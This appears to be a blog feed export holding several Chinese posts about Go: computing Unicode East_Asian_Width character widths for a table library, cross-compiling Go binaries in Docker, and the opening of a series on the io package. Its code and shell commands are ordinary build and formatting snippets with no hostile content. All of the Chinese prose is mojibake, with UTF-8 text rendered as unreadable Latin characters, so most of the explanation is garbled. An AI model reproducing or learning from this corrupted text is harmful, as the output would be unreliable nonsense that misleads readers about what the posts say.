ËØ•ÈóÆÈ¢òÂíåËØ≠Ë®ÄÊó†ÂÖ≥, Âè™Ë¶Å‰Ω†‰ΩøÁî®unicode Â∞±‰ºöÊúâËøô‰∏™ÈóÆÈ¢ò, È°∫ÁùÄËøô‰∏™ÈóÆÈ¢ò Êàë‰ª¨Êù•ËØ¥ÊòéGolangÁöÑ‰∏≠ÁöÑÂ≠óÁ¨¶Á±ªÂûãRune Golang‰∏≠ÁöÑRuneÁ±ªÂûãÂú®python‰∏≠‰∏Ä‰∏™Â≠óÁ¨¶‰ª•charÁ±ªÂûãË°®Á§∫, ËÄåÂú®Golang‰∏≠Â≠óÁ¨¶Á±ªÂûã‰ª•RuneË°®Á§∫, Ê≥®ÊÑèÂ≠óÁ¨¶ÈÄöËøáÁ†ÅË°®(code point)Êù•ËøõË°åÁøªËØë, ÊâÄ‰ª•Â≠óÁ¨¶‰∏≤ÊòØÁ†ÅË°®ÁøªËØëËøáÊù•ÊãºÊé•ËÄåÊàêÁöÑ, ÊâÄ‰ª•‰∏çË¶ÅÂÇªÂÇªÊêû‰∏çÊ∏ÖÊ•öruneÂíåstringÁöÑÂå∫Âà´„ÄÇ golangÈáåÈù¢Áî® ‚Äú‚Äù Ë°®Á§∫Â≠óÁ¨¶‰∏≤, Áî®Êà∑``Ë°®Á§∫Â§öË°åÂ≠óÁ¨¶‰∏≤, ‚Äò‚ÄôË°®Á§∫Â≠óÁ¨¶, ÊØîÂ¶Ç:1234a := "Â≠óÁ¨¶‰∏≤"b := `Â§öË°åÂ≠óÁ¨¶‰∏≤`c := '‰∏≠' ËØ•ÁΩëÁ´ôÊúâunicodeÁöÑÁ†Å‰ΩçË°®: unicode-utf8-table, Êàë‰ª¨‰ªé‰∏≠ÊâæÂá∫‰∏ÄÈÉ®ÂàÜÊù•ÂÅöÊµãËØï: Êàë‰ª¨‰ª•ÊâìÂç∞‰∏ã4e07‰∏∫‰æãÊù• È™åËØÅ‰∏ãcode point:1234func main() &#123; fmt.Printf("%c\n", 0x4e07) fmt.Printf("%x\n", '‰∏á')&#125; ÂÖ≥‰∫éÂ≠óÁ¨¶ÂÆΩÂ∫¶ÁºñÁ†Å‰πãÊàòÂßã‰∫éAsciiÁ†ÅÁ©∫‰ΩôÁöÑÁ¨¨8‰Ωç, ÊúÄÁªà‰ª•unicodeÁªü‰∏Ä ËøôÊòØ‰∏ÄÂú∫ÊÉäÂøÉÂä®È≠ÑÁöÑÂéÜÂè≤, ÊàëÂú®‰πãÂâçÁØáËøêÁª¥ÁöÑÂçöÂÆ¢‰∏≠ÊúâËøá‰ªãÁªç, ÂΩìÊó∂Ëä±‰∫Ü1‰∏™ÊòüÊúüÊí∏ÁºñÁ†ÅÈóÆÈ¢ò, ÂêéÈù¢‰ºöÂ∞ÜÂÖ∂ËΩ¨ËøáÊù•(‰π∞ÁöÑVPSÂø´Âà∞Êúü‰∫Ü)„ÄÇ ÂÖ≥‰∫éÁºñÁ†Å‰ªãÁªç: ÁºñÁ†Å‰πãÊàò Êúâ‰∫Ü‰∏äÈù¢ÁöÑÂü∫Á°Ä, Êàë‰ª¨ÁªßÁª≠Â≠óÁ¨¶ÂÆΩÂ∫¶ÁöÑÈóÆÈ¢ò, ÊñáÁ´†Ê†áÈ¢òÂê´Êúâ:East_Asian_Width, Ëøô‰∏™‰∏úË•øÂæàÈáçË¶Å, ÂÆÉÂú®unicodeÊ†áÂáÜ‰∏≠Ë¥üË¥£ÂÆö‰πâÂ≠óÁ¨¶ÁöÑÂÆΩÂ∫¶„ÄÇËÆ©Êàë‰ª¨Áî±ÊµÖÂÖ•Ê∑±ÁöÑÂºÄÂßã‰ªãÁªç„ÄÇ Êà™Ê≠¢ÊàëÂÜôËøôÁØáÂçöÂÆ¢‰πãÊó∂, unicodeËßÑËåÉÁöÑÁ®≥ÂÆöÁâàÊòØÁ¨¨9ÁâàÔºåÂºÄÂèëÁâàÊòØÁ¨¨10Áâà, Êàë‰∏ªË¶ÅÂèÇËÄÉunicode9ËßÑËåÉÁöÑÊñáÊ°£„ÄÇ Âú®unicode9‰∏≠ÁöÑÊäÄÊúØÊä•Âëä‰∏≠ÊúâÂÖ≥‰∫é unicodeÊ†áÂáÜÁöÑÊâÄÊúâÁöÑËßÑËåÉ: Unicode Technical Reports , ÂÖ∂‰∏≠ Unicode Standard Annexes ÊèèËø∞‰∫ÜunicodeÊâÄÊúâÁõ∏ÂÖ≥ËßÑËåÉÔºåÂÖ∂‰∏≠Ëøô2‰∏™ËßÑËåÉÈúÄË¶ÅÊàë‰ª¨ÂÖ≥Ê≥®: UNICODE CHARACTER DATABASE: Áî®‰∫éÊèèËø∞Á†ÅË°®(code point), Êó¢UnicodeÂ≠óÁ¨¶Êï∞ÊçÆÂ∫ì(UCD),ÂÆÉÊèèËø∞‰∫ÜUnicodeÂ≠óÁ¨¶Êï∞ÊçÆÂ∫ìÁöÑÂ∏ÉÂ±ÄÂíåÁªÑÁªáÔºå‰ª•ÂèäÂÆÉÂ¶Ç‰ΩïÊåáÂÆöUnicodeÂ≠óÁ¨¶Â±ûÊÄßÁöÑÂΩ¢ÂºèÂåñÂÆö‰πâ. EAST ASIAN WIDTH: Áî®‰∫éÊèèËø∞‰∏ú‰∫ö‰º†ÁªüÂ≠óÁ¨¶ÈõÜÁöÑ‰ø°ÊÅØÂ±ûÊÄßÁöÑËßÑËåÉ, ÂÖ∂‰∏≠Â∞±ÂåÖÊã¨Â≠óÁ¨¶ÂÆΩÂ∫¶.Âú®UCDËßÑËåÉ‰∏≠, unicodeÂ≠óÁ¨¶Êúâ‰∏Ä‰∏™East_Asian_WidthÂ±ûÊÄß(5.11.1ÊèèËø∞‰∫Ü‰∫åËøõÂà∂Â±ûÊÄß),ÂÆö‰πâ‰∫Ü‰∏Ä‰∏™unicodeÂ≠óÁ¨¶ÂèØËÉΩÂá∫Áé∞ÁöÑÂ≠óÁ¨¶ÂÆΩÂ∫¶„ÄÇ12345678# East_Asian_Width (ea)ea ; A ; Ambiguousea ; F ; Fullwidthea ; H ; Halfwidthea ; N ; Neutralea ; Na ; Narrowea ; W ; Wide ÂÖ∂‰∏≠Èô§A‰∏çÁ°ÆÂÆöÂ§ñÔºåF/H/N/Na/WÈÉΩËÉΩÂæàÊòéÁ°ÆÁöÑÁü•ÈÅìÂÆΩÂ∫¶„ÄÇÂõ†Ê≠§ÊØè‰∏Ä‰∏™unicodeÂ≠óÁ¨¶Êàë‰ª¨Âè™ÈúÄË¶ÅÁü•ÈÅìÂÖ∂East_Asian_WidthÂ±ûÊÄßÁöÑÂÄº Â∞±ÂèØÁü•ÈÅìÂÖ∂Â≠óÁ¨¶ÁöÑÂÆΩÂ∫¶, ‰ΩÜÊòØÊü•Áúã‰∫Ü‰∏ãGolang unicodeÊ†áÂáÜÂ∫ì, Âπ∂Ê≤°ÊúâÂèëÁé∞East_Asian_WidthÁõ∏ÂÖ≥Â±ûÊÄßÁöÑÂÆûÁé∞ÂíåÊñπÊ≥ï, Âõ†Ê≠§‰º∞ËÆ°ÈúÄË¶ÅËá™Â∑±ÂÆûÁé∞‰∫Ü„ÄÇ Â¶Ç‰ΩïÂÆûÁé∞East_Asian_WidthÂñÉ?, ËøôÂ∞±ÈúÄË¶ÅÂàöÊâçÊèêÂà∞ÁöÑunicodeËßÑËåÉ‰∏≠ÁöÑÂè¶Â§ñ‰∏Ä‰∏™ËßÑËåÉEAST ASIAN WIDTH, ËØ•ÊñáÊ°£Êï¥ÁêÜÂá∫‰∫ÜÊâÄÊúâÁöÑunicodeÂ≠óÁ¨¶ÁöÑÂÆΩÂ∫¶ÁöÑËåÉÂõ¥Ë°®, ËØ•ËßÑËåÉÁöÑ 6.3ËäÇ‰∏≠ ÁªôÂá∫‰∫ÜËøô‰∏™ËåÉÂõ¥Ë°®unicodeÂ≠óÁ¨¶ÂÆΩÂ∫¶ËåÉÂõ¥Ë°®,Âè™Ë¶ÅÊúâËøôÂº†Ë°®Êàë‰ª¨Â∞±ÂèØ‰ª•Áü•ÈÅìÂ≠óÁ¨¶ÂÆΩÂ∫¶„ÄÇ Âõ†Ê≠§Êàë‰ª¨Ê†πÊçÆËøôÂº†ËåÉÂõ¥Ë°®ÂèØ‰ª•ÂÆûÁé∞‰∏Ä‰∏™Ëé∑ÂèñunicodeÂ≠óÁ¨¶ÂÆΩÂ∫¶ÁöÑÂäüËÉΩÊ®°Âùó, ÈªòËÆ§F/W‰∏∫Fullwidth, ÂÖ∂‰ªñ‰∏∫Halfwidth, ËØ•Ê®°ÂùóÂÖ∑‰Ωì‰ª£Á†ÅËßÅ: east_asian_width, Êúâ‰∫ÜËøô‰∏™Ê®°ÂùóÊàë‰ª¨Â∞±ÂèØ‰ª•Êù•Ëß£ÂÜ≥ Â≠óÁ¨¶ÂÆΩÂ∫¶ÈóÆÈ¢ò‰∫Ü Ëß£ÂÜ≥Â≠óÁ¨¶ÂÆΩÂ∫¶ÈóÆÈ¢òÊàë‰ª¨ÊâæÂà∞simpletalbeÈáåÈù¢ÂÖ≥‰∫éÂ≠óÁ¨¶ÈïøÂ∫¶ÁöÑ‰ª£Á†Å:123456789101112131415// width returns content widthfunc (c *content) width() int &#123; m := c.maxLinewidth() if m &gt; c.w &#123; return m &#125; return c.w&#125;// line formats content linefunc (c *content) line(l string, a int) string &#123; len := c.width() - utf8.RuneCountInString(l) ...&#125; Êàë‰ª¨ÂÆö‰πâÂ•ΩËé∑ÂèñÂ≠óÁ¨¶ÈïøÂ∫¶ÁöÑÂáΩÊï∞ÔºåÊèê‰æõÊéâ‰ªñÁöÑÂà§Êñ≠ÊñπÊ≥ï123456789101112131415161718192021222324252627282930313233343536// get the string widthfunc getStringWidth(str string) int &#123; w := 0 for _, c := range []rune(str) &#123; if IsHalfwidth(c) &#123; w = w + 1 &#125; else &#123; w = w + 2 &#125; &#125; return w&#125;// width returns maximum content lines widthfunc (c *content) maxLinewidth() int &#123; w := 0 for _, r := range c.c &#123; l := getStringWidth(r) if l &gt; w &#123; w = l &#125; &#125; return w&#125;// line formats content linefunc (c *content) line(l string, a int) string &#123; len := c.width() - getStringWidth(l) ...&#125; ÁÑ∂ÂêéÊµãËØïÊïàÊûú123456789101112131415161718Default style+----+------------------+----------------+-----------------------------+------+| # | NAME | PHONE | EMAIL | QTTY |+----+------------------+----------------+-----------------------------+------+| 1 | Newton G. Goetz | 252-585-5166 | NewtonGGoetz@dayrep.com | 10 || 2 | Rebecca R. Edney | 865-475-4171 | RebeccaREdney@armyspy.com | 12 || 3 | John R. Jackson | 810-325-1417 | JohnRJackson@armyspy.com | 15 || 4 | Ron J. Gomes | 217-450-8568 | RonJGomes@rhyta.com | 25 || 5 | Penny R. Lewis | 870-794-1666 | PennyRLewis@rhyta.com | 5 || 6 | Sofia J. Smith | 770-333-7379 | SofiaJSmith@armyspy.com | 3 || 7 | Karlene D. Owen | 231-242-4157 | KarleneDOwen@jourrapide.com | 12 || 8 | Daniel L. Love | 978-210-4178 | DanielLLove@rhyta.com | 44 || 9 | Julie T. Dial | 719-966-5354 | JulieTDial@jourrapide.com | 8 || 10 | Juan J. Kennedy | 908-910-8893 | JuanJKennedy@dayrep.com | 16 || 11 | adfsb‚Äú | ÁâπÊÆäÂ≠óÁ¨¶Â§πÊ∏£ ‚ÑÉ | JuanJKennedy@dayrep.com | 16 |+----+------------------+----------------+-----------------------------+------+| Subtotal | 166 |+----+------------------+----------------+-----------------------------+------+]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>unicode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Â¶Ç‰Ωï‰ΩøÁî®ÂÆπÂô®buildÂ§öÂπ≥Âè∞golangÁ®ãÂ∫è]]></title>
    <url>%2F2017%2F05%2F08%2Fbuild-goapp-with-docker%2F</url>
    <content type="text"><![CDATA[Âú®CIÂíåCDÁéØÂ¢É‰∏≠, goalngÊ∫êÁ†ÅÁ®ãÂ∫èÂæÄÂæÄÈúÄË¶Åbuild‰∏çÂêåÂπ≥Âè∞ÁöÑ‰∫åËøõÂà∂Á®ãÂ∫è, ËøôÊó∂ÂÄô‰ΩøÁî®ÂÆπÂô®ÊòØ‰∏Ä‰∏™‰∏çÈîôÁöÑÈÄâÊã©, Âõ†‰∏∫buildÂÆåÊàêÂêé,Êàë‰ª¨ÂèØ‰ª•Á´ãÂç≥ÈáäÊîæÂÆπÂô®, ËÄå‰∏î‰πü‰øùËØÅ‰∫ÜbuildÁéØÂ¢ÉÁöÑÂπ≤ÂáÄ„ÄÇ Âü∫‰∫éÂÆπÂô®ÁöÑbuild‰ΩøÁî®ÂÆπÂô®Êù•ËøõË°åbuild, ÊâÄÈÅáÂà∞ÁöÑ‰∏Ä‰∫õÂ∞èÂùë„ÄÇ ÈóÆÈ¢òÊàë‰ª¨ÈááÁî®vendorÊù•ÂÅögolangÈ°πÁõÆÁöÑ‰æùËµñÁÆ°ÁêÜ, buildÁöÑdockerÈïúÂÉèÊãâÂèñÁöÑÂÆòÊñπÁöÑgolangÂÆòÊñπÈïúÂÉè, ÊåâÁÖßÈïúÂÉèÁöÑ‰ΩøÁî®ËØ¥Êòé:1$ docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp golang:1.6 go build -v ‰ΩÜÊòØÂç¥Ê≤°ÊúâÊàêÂäü, ÊàëÈ°πÁõÆ‰∏ãÈù¢ÁöÑvendorÁöÑ‰æùËµñÂπ∂Ê≤°ÊúâË¢´goÊâæÂà∞„ÄÇ Ëß£ÂÜ≥ÂäûÊ≥ïÂú®ÂêÑÁßçgoogle‰πãÂêé‰πüÊ≤°ÊâæÂà∞ÂéüÂõ†„ÄÇ‰ªîÁªÜËßÇÂØüÂÆòÊñπÁöÑÁ§∫‰æãÊâçÂèëÁé∞Ôºå‰ΩøÁî®vendorÂäüËÉΩÊó∂ÂåÖÈÉΩÂú®$GOPATH/src‰∏ãÔºåÊµãËØï‰∫Ü‰∏Ä‰∏ãÔºåÊûúÁÑ∂ÊòØËøôÊ†∑„ÄÇÂè™ÊúâÂú®$GOPATH/src‰∏ãÁöÑÂåÖÔºåÊâçËÉΩ‰ΩøÁî®vendorÁõÆÂΩïÂ≠òÊîæ‰æùËµñÂåÖ„ÄÇ Áé∞Âú®goÂØπ‰∏çÂú®$GOPATH/src‰∏ãÂºÄÂèëÁöÑÈ°πÁõÆÈôêÂà∂Ë∂äÊù•Ë∂äÂ§öÔºåÊâÄ‰ª•Ëß£ÂÜ≥ÂäûÊ≥ïÂ∞±ÂæàÊòéÊòæ‰∫Ü, Â∞ÜÈ°πÁõÆÊåÇÂà∞GOPATHÁöÑsrc‰∏ãÈù¢, Êü•‰∏ãÈïúÂÉèÁöÑÂêéÂèëÁé∞GOPATHÂ∞±ÊòØ/goÔºåÊâÄ‰ª•Ëß£ÂÜ≥ÂäûÊ≥ïÊòØËøôÊ†∑1$ docker run --rm -v "$PWD":/go/src/myapp -w /go/src/myapp golang:1.6 go build -v Ê≥®ÊÑè Â∞ÜmyappÊõøÊç¢Êàê‰Ω†È°πÁõÆÁúüÊ≠£ÁöÑÂêçÁß∞„ÄÇ Â§öÂπ≥Âè∞ÊâìÂåÖÈÄöËøáÂú®docker‰∏≠ËøõË°å‰∫§ÂèâÁºñËØëÔºå‰∫ßÂá∫ÂêÑÁßçÂπ≥Âè∞ÁöÑ‰∫åËøõÂà∂Êñá‰ª∂„ÄÇ Êú¨Âú∞ÁºñËØëÁÆÄÂçïÊù•ËÆ≤ÔºåÊú¨Âú∞ÁºñËØëÂ∞±ÊòØ‰ª• Êú¨Âú∞ÁéØÂ¢É‰Ωú‰∏∫ËΩØ‰ª∂ËøêË°åÁöÑÁõÆÊ†áÁéØÂ¢ÉÊù•ËøõË°å Á®ãÂ∫èÁöÑÁºñËØë, Âõ†Ê≠§Â¶ÇÊûú‰Ω†Êú¨Âú∞ÁéØÂ¢ÉÊòØMacÔºåÈÇ£‰πàÂ∞±Âè™ËÉΩÁºñËØëdarwinÂπ≥Âè∞ÁöÑÔºåÂ¶ÇÊûú‰Ω†Êú¨Âú∞ÊòØLinuxÂ∞±Âè™ËÉΩÁºñËØëÂá∫LinuxÂπ≥Âè∞ÁöÑ„ÄÇÂ¶ÇÊûú‰Ω†ÈúÄË¶ÅÂèëÂ∏ÉÂ§öÁßçÂπ≥Âè∞ÁöÑËΩØ‰ª∂ÔºåÈÇ£‰πà‰Ω†Â∞±ÈúÄË¶ÅÂáÜÂ§áÂ§öÁßçÁéØÂ¢É, Êù•ËøõË°åÂàÜÂà´build, ËøôÊòØÊûÅÂÖ∂‰∏ç‰æøÁöÑ„ÄÇ ËÄå‰∏îÂØπ‰∫é‰∏Ä‰∫õÂµåÂÖ•ÂºèËÆæÂ§áËÄåË®ÄÔºåÂÖ∂ÊÄßËÉΩÊúâÈôê, ÊØîÂ¶Ç‰ΩéÈÖçÁöÑARMÂπ≥Âè∞, ÂæàÂ§öÊÉÖÂÜµ‰∏ãÊó†Ê≥ïËÉú‰ªªÊú¨Âú∞ÁºñËØë„ÄÇ ‰ΩÜÊòØÊú¨Âú∞ÁºñËØë‰πüÊúâ‰ªñÁöÑ‰ºòÁÇπ: Êú¨Âú∞ÁéØÂ¢ÉÁöÑÂéüÁîüÊÄßÔºåÊúâÂä©‰∫é‰øùÈöúÁ®ãÂ∫èÁºñËØëÂêéÁöÑÁ®≥ÂÆöÊÄßÂíåÂèØÈù†ÊÄß, Âõ†Ê≠§Êú¨Âú∞ÁºñËØëÊòØÊúÄÂèØÈù†ÁöÑ‰∏ÄÁßçÊâãÊÆµ„ÄÇ ‰∫§ÂèâÁºñËØëÁÆÄÂçïÂú∞ËØ¥ÔºåÂ∞±ÊòØÂú®‰∏Ä‰∏™Âπ≥Âè∞‰∏äÁîüÊàêÂè¶‰∏Ä‰∏™Âπ≥Âè∞‰∏äÁöÑÂèØÊâßË°åÁ®ãÂ∫è, ÊâÄ‰ª•Â∏¶Êù•‰∫ÜÂæàÂ§ßÁöÑÊñπ‰æøÊÄß, ‰∏çÁî®ÂáÜÂ§áÈÇ£‰πàÂ§öÂπ≥Âè∞ÁöÑÁéØÂ¢É‰∫Ü„ÄÇ Ë¶ÅËøõË°å‰∫§ÂèâÁºñËØë, ÈÇ£‰πàÂøÖÈ°ªÂáÜÂ§áÂ•Ω‰∫§ÂèâÁºñËØëÁöÑÁéØÂ¢É, ‰∫§ÂèâÁºñËØëÁéØÂ¢É‰∏ÄËà¨Áî± ‰∫§ÂèâÁºñËØëÂô®ÂíåÂ∑•ÂÖ∑ÂåÖÁªÑÊàê, Â¶ÇÊûú‰Ω†‰ΩøÁî®c/c++ÈÇ£‰πà‰Ω†ÈúÄË¶Å ‰∏ãËΩΩÈõÜÊàêÂ•ΩÁöÑ‰∫§ÂèâÁºñËØëÁéØÂ¢ÉÔºå‰πüÂèØ‰ª•Ëá™Â∑±Âà∂‰Ωú ÔºàÊØîËæÉÂ§çÊùÇÔºåÂª∫ËÆÆËØªËÄÖ‰∏ãËΩΩÈõÜÊàêÂ•ΩÁöÑ‰∫§ÂèâÁºñËØëÁéØÂ¢ÉÔºâ, ‰ΩÜÊòØËøô‰∫õGolangÊó©Â∑≤ÁªèÁúãÁ©ø‰∫Ü, Âú®GolangÁöÑÂ∑•ÂÖ∑Èìæ‰∏äÂ∑≤ÁªèÈõÜÊàêÂ•Ω‰∫Ü, Âõ†Ê≠§Áõ¥Êé•‰ΩøÁî®Âç≥ÂèØ„ÄÇ Êé•‰∏ãÊù•‰ªãÁªçGolang‰∏≠ÁöÑ‰∫§ÂèâÁºñËØë„ÄÇ Golang‰∏≠ÁöÑ‰∫§ÂèâÁºñËØëGolangÁöÑ‰∫§ÂèâÁºñËØë‰æùËµñ2‰∏™ÁéØÂ¢ÉÂèòÈáèÁöÑÊéßÂà∂: $GOARCH ÁõÆÊ†áÂπ≥Âè∞ÔºàÁºñËØëÂêéÁöÑÁõÆÊ†áÂπ≥Âè∞ÔºâÁöÑÂ§ÑÁêÜÂô®Êû∂ÊûÑÔºà386„ÄÅamd64„ÄÅarmÔºâ $GOOS ÁõÆÊ†áÂπ≥Âè∞ÔºàÁºñËØëÂêéÁöÑÁõÆÊ†áÂπ≥Âè∞ÔºâÁöÑÊìç‰ΩúÁ≥ªÁªüÔºàdarwin„ÄÅfreebsd„ÄÅlinux„ÄÅwindowsÔºâ ‰∫§ÂèâÁºñËØëÁöÑÁ≥ªÁªüË¶ÅÊ±Ç: OS ARCH OS version linux 386/amd64/arm &gt;= Linux 2.6 darwin 386/amd64 OS X (Snow Leapard + Lion) freebsd 386/amd64 &gt;= FreeBSD 7 windows 386/amd64 &gt;= Windows 2000 ËøõË°å‰∫§ÂèâÁºñËØë(Â∞ΩÈáèÂáèÂ∞ë‰æùËµñ,Êñπ‰æøÁõ¥Êé•ÊîæÂÖ•dockerËøêË°å, ÊâÄ‰ª•ÁºñËØëÊó∂Á¶ÅÁî®ÁöÑCGO):123456789# Â¶ÇÊûú‰Ω†ÊÉ≥Âú®Windows 32‰ΩçÁ≥ªÁªü‰∏ãËøêË°å$ CGO_ENABLED=0 GOOS=windows GOARCH=386 go build# Â¶ÇÊûú‰Ω†ÊÉ≥Âú®Windows 64‰ΩçÁ≥ªÁªü‰∏ãËøêË°å$ CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build# Â¶ÇÊûú‰Ω†ÊÉ≥Âú®Linux 32‰ΩçÁ≥ªÁªü‰∏ãËøêË°å$ CGO_ENABLED=0 GOOS=linux GOARCH=386 go build# Â¶ÇÊûú‰Ω†ÊÉ≥Âú®Linux 64‰ΩçÁ≥ªÁªü‰∏ãËøêË°å$ CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang IOÁ≥ªÂàó(‰∏Ä) - Âü∫Êú¨ÁöÑIOÊé•Âè£]]></title>
    <url>%2F2017%2F05%2F06%2Fgolang-io%2F</url>
    <content type="text"><![CDATA[Âú®GolangÂºÄÂèëËøáÁ®ã‰∏≠Èõ∂Èõ∂Êï£Êï£‰ºöÈÅáÂà∞ÂêÑÁßçIOÊìç‰Ωú, ÊØèÊ¨°ÁôæÂ∫¶Google‰πüËÉΩËß£ÂÜ≥, Â§ßÊ¶ÇÁî®Ê≥ï‰πüËøòÊòØÊ∏ÖÊ•ö, ‰ΩÜÊòØÁº∫Â∞ëÁ≥ªÁªüÊÄßÁöÑÂÖ®Èù¢‰∫ÜËß£, ‰πüÊêû‰∏çÊ∏ÖÊ•ö, ‰ΩøÁî®Âì™‰∏™ÊñπÂºèÊâçÊòØÊúÄ‰ºòÁöÑ, Âõ†Ê≠§ÊâìÁÆóÂÖ®Èù¢ËØª‰∏ÄÈÅçÊ†áÂáÜÂ∫ì‰∏≠‰∏éioÁõ∏ÂÖ≥ÁöÑÊ∫êÁ†Å, ÊÄªÁªìÊàê‰∏ÄÁ≥ªÂàóÁöÑÂçöÂÆ¢„ÄÇ Ëøô‰∏ÄÁ≥ªÂàóËøôÊòØËøô‰∏ÄÁ≥ªÂàóÁöÑ‰∏Ä‰∏™ÂºÄÁØá, ‰∏ªË¶ÅËÆ≤Ê†áÂáÜÂ∫ì‰∏≠ÁöÑ‰∏Ä‰∫õioÁõ∏ÂÖ≥, Êï¥‰∏™Á≥ªÂàóÊâìÁÆóÂÜô7ÁØá: Âü∫Á°ÄÁØá Âü∫Êú¨ÁöÑIOÊé•Âè£(io) È´òÁ∫ßÁöÑIOÊé•Âè£(ioutil) IOÁöÑÊ†ºÂºèÂåñ(fmt) IOÁöÑÁºìÂÜ≤(bufio) ËøêÁî®ÁØá Â≠óÁ¨¶‰∏≤Êìç‰Ωú(strings.Reader) Â≠óËäÇÊìç‰Ωú(bytes.buffer) Êñá‰ª∂Êìç‰Ωú(os.File) IOÁöÑÊ¶ÇÂøµIOÂú®ËÆ°ÁÆóÊú∫‰∏≠ÊåáInput/OutputÔºå‰πüÂ∞±ÊòØËæìÂÖ•ÂíåËæìÂá∫„ÄÇÁî±‰∫éÁ®ãÂ∫èÂíåËøêË°åÊó∂Êï∞ÊçÆÊòØÂú®ÂÜÖÂ≠ò‰∏≠È©ªÁïôÔºåÁî±CPUËøô‰∏™Ë∂ÖÂø´ÁöÑËÆ°ÁÆóÊ†∏ÂøÉÊù•ÊâßË°åÔºåÊ∂âÂèäÂà∞Êï∞ÊçÆ‰∫§Êç¢ÁöÑÂú∞ÊñπÔºåÈÄöÂ∏∏ÊòØÁ£ÅÁõò„ÄÅÁΩëÁªúÁ≠âÔºåÂ∞±ÈúÄË¶ÅIOÊé•Âè£„ÄÇÂêÑÁßçËØ≠Ë®Ä‰∏ÄËà¨ÈÉΩ‰ºöÊèê‰æõIOÂ∫ì‰æõÂºÄÂèëËÄÖ‰ΩøÁî®„ÄÇGoËØ≠Ë®Ä‰πü‰∏ç‰æãÂ§ñ„ÄÇInputÊåáÂæÄÂÜÖÂ≠ò‰∏≠ËØªÂèñÊï∞ÊçÆ, ÊØîÂ¶ÇËØªÂèñÊñá‰ª∂, ËØªÂèñÊúçÂä°Âô®ÂìçÂ∫îÁöÑÁΩëÁªúÊï∞ÊçÆ, Âú®GolangÁöÑIOÊé•Âè£‰∏≠‰∏ªË¶Å‰ª•ReaderÊù•ÂÆåÊàê„ÄÇOutoutÊåá‰ªéÂÜÖÂ≠ò‰∏≠ÂæÄÂ§ñÂèëÈÄÅÊï∞ÊçÆ, ÊØîÂ¶ÇÂ∞ÜÊï∞ÊçÆ‰øùÂ≠òÂõûÁ£ÅÁõòÁöÑÊñá‰ª∂, ‰Ωú‰∏∫ÊúçÂä°Á´ØÊó∂ÔºåËøîÂõûÂÆ¢Êà∑ÈúÄË¶ÅÁöÑÊï∞ÊçÆ, Âú®GolangÁöÑIOÊé•Âè£‰∏≠‰∏ªË¶Å‰ª•WriterÊù•ÂÆåÊàê„ÄÇÂú®IOÁºñÁ®ã‰∏≠ÔºåËøòÊúâ‰∏Ä‰∏™ÂæàÈáçË¶ÅÁöÑÊ¶ÇÂøµ:Stream(ÊµÅ), ÂèØ‰ª•ÊääÊµÅÊÉ≥Ë±°Êàê‰∏Ä‰∏™Ê∞¥ÁÆ°ÔºåÊï∞ÊçÆÂ∞±ÊòØÊ∞¥ÁÆ°ÈáåÁöÑÊ∞¥Ôºå‰ΩÜÊòØÂè™ËÉΩÂçïÂêëÊµÅÂä®„ÄÇInput StreamÂ∞±ÊòØÊï∞ÊçÆ‰ªéÂ§ñÈù¢ÔºàÁ£ÅÁõò„ÄÅÁΩëÁªúÔºâÊµÅËøõÂÜÖÂ≠òÔºåOutput StreamÂ∞±ÊòØÊï∞ÊçÆ‰ªéÂÜÖÂ≠òÊµÅÂà∞Â§ñÈù¢Âéª„ÄÇËÄåÂÉèÊ∞¥ÁÆ°ËøôÊ†∑ÁöÑ‰∏úË•øÔºåÂú®‰∏çÂêåËØ≠Ë®ÄÈáåÂü∫Êú¨ÈÉΩÊúâ‰∏Ä‰∏™‰∏ÄÊ†∑ÁöÑÂêçÁß∞:pipe, Golang‰∏≠ÂÖ≥‰∫épipeÁöÑ‰∏Ä‰∫õÂäüËÉΩÂáΩÊï∞ÈÉΩÂÆö‰πâÂú®Ëøô‰∏™Êñá‰ª∂ÈáåÈù¢„ÄÇ IOÂåÖÁöÑÊñá‰ª∂‰∏çË¶ÅÊúâÊÅêÊÉßÂøÉÁêÜ, IOÊ†áÂáÜÂ∫ìÁöÑ‰ª£Á†ÅÈáèÂÖ∂ÂÆûÂπ∂‰∏çÂ§ö, Èô§ÂéªtestÂíåexample, Ââ©‰∏ãÁöÑÊ®°ÂùóÂÖ∂ÂÆûÂ∞±5‰∏™(io.go, multi.go, pipe.go, ioutil.go, tempfile.go), ÊÄªÂÖ±‰πüÊâçÂçÉ‰ΩôË°å‰ª£Á†ÅÔºåËÄå‰∏îËøòÊúâÂ∞ÜËøë‰∏ÄÂçäÊòØÊ≥®Èáä„ÄÇ1234567891011121314151617‚ûú io tree ..‚îú‚îÄ‚îÄ example_test.go‚îú‚îÄ‚îÄ io.go‚îú‚îÄ‚îÄ io_test.go‚îú‚îÄ‚îÄ ioutil‚îÇ ‚îú‚îÄ‚îÄ example_test.goF‚îÇ ‚îú‚îÄ‚îÄ ioutil.go‚îÇ ‚îú‚îÄ‚îÄ ioutil_test.go‚îÇ ‚îú‚îÄ‚îÄ tempfile.go‚îÇ ‚îî‚îÄ‚îÄ tempfile_test.go‚îú‚îÄ‚îÄ multi.go‚îú‚îÄ‚îÄ multi_test.go‚îú‚îÄ‚îÄ pipe.go‚îî‚îÄ‚îÄ pipe_test.go1 directory, 12 files ËøôÁØáÂçöÂÆ¢‰∏ªË¶ÅÂÖ≥Ê≥®io.goÔºåmulti.go, pipe.go 3‰∏™Êñá‰ª∂„ÄÇ ‰ªéIOÂåÖÁöÑÊ≥®Ëß£ÂºÄÂßãËÆ≤Ëµ∑ioÂåÖ‰∏∫I/OÂéüËØ≠Êèê‰æõ‰∫ÜÂü∫Êú¨ÁöÑÊé•Âè£„ÄÇÂÆÉ‰∏ªË¶ÅÂäüËÉΩÊòØÂåÖË£Ö‰∫ÜËøô‰∫õÂéüËØ≠ÁöÑÂ∑≤ÊúâÂÆûÁé∞, Ëøô‰∏™ÊèèËø∞ÂæóÊúâÁÇπÁªï, Áõ¥ÁôΩÊù•ËØ¥: 